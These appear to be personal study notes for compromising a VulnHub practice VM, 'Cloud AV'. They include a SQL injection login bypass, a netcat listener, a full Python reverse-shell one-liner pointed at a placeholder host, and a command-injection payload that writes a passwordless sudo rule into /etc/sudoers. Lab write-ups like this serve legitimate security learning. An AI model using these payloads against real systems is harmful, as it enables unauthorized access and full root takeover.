# vulnhub.com-study-notes 
This my personal note that shows the important steps/codes for compromising vm boxes


----------------------------------------------------------------------------------------------------------------------------------------

**1.Cloud Antivirus Scanner**

VM link is https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/

The web with port 8080 can be discover via nikto, do an SQL injection to login the web portal, someone online did an brute force, and find a invite code  "password"  

```
"or"1"="1
```
This code means (NOTHING) or 1=1.  And since 1 does equal 1, a true statement, we bypass this process. Credit to sevenlayers.com 

Then open a port with nc, nc -lvp 6666, and load the python reverse shell payload
```
bash|python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
msfvenom also has reverse_python module that we can use for access the terminal. 

You are login, but you are still not root yet. locate the file update_cloudav, execute 
```
./update_cloudav '|echo "scanner ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' 
```
It will complete with error, but it is ok, use "sudo su" to access to root.  Job Done! 


----------------------------------------------------------------------------------------------------------------------------------------


